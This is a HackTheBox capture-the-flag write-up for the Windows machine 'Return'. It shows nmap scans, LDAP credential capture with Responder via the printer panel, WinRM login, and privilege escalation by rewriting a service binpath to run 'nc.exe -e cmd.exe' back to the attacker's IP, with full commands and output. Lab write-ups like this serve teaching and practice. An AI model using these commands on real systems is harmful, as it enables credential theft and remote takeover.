# Return

# User Flag

## NMAP Enumeration

NMAP Port Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.11.108

PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
80/tcp    open  http           syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
389/tcp   open  ldap           syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
636/tcp   open  ldapssl        syn-ack ttl 127
3268/tcp  open  globalcatLDAP  syn-ack ttl 127
5985/tcp  open  wsman          syn-ack ttl 127
9389/tcp  open  adws           syn-ack ttl 127
47001/tcp open  winrm          syn-ack ttl 127
49664/tcp open  unknown        syn-ack ttl 127
49665/tcp open  unknown        syn-ack ttl 127
49666/tcp open  unknown        syn-ack ttl 127
49668/tcp open  unknown        syn-ack ttl 127
49671/tcp open  unknown        syn-ack ttl 127
49678/tcp open  unknown        syn-ack ttl 127
49679/tcp open  unknown        syn-ack ttl 127
49680/tcp open  unknown        syn-ack ttl 127
49683/tcp open  unknown        syn-ack ttl 127
49740/tcp open  unknown        syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.11.108 -p 53,80,88,135,139,389,445,464,593,636,3268,5985,9389,47001,49664,49665,49666,49668,49671,49678,49679,49680,49683,49740

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-30 13:47:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49740/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-30T13:48:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m37s
```

## Web Enumeration

Found a website hosted on port 80. The website has a settings page, which looks to make a request to `printer.return.local` over port 389 with the user `svc-printer`. The password is not visible:

![Settings Page](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Return/Images/Web%20-%20Settings%20Page.png)

It stands to reason, that if we change the server address to our attacker machine and spin up `responder`, we will be able to capture any LDAP requests that contain the user `svc-printer` and the accounts password.

```bash
sudo python3 /usr/share/responder/Responder.py -I tun0 -dwv

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.108
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

Checked for WinRM access:

```bash
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'

WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

Got the user flag:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/30/2024   6:41 AM             34 user.txt
```

# Root Flag

## Windows Privilege Escalation

Checked account privileges and group permissions:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

Can see that the user `svc-printer` is a member of the `Server Operators` [group](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators). Members of the Server Operators group can sign in to a server interactively, create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer, and shut down the computer.

1. Started by uploading `nc.exe` to the victim machine.
2. List `services`:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services
```

3. Change the config of an existing service so it uses the netcat instead for it’s binary:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VSS binpath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.12 4444"
[SC] ChangeServiceConfig SUCCESS
```

4. Verify the service has been changed:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------                  
C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.12 4444                                                          True VSS
```

5. Start up a netcat reverse shell on kali and then start service:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VSS
```

6. Get a reverse shell on netcat:

```bash
$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.108] 56212
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```






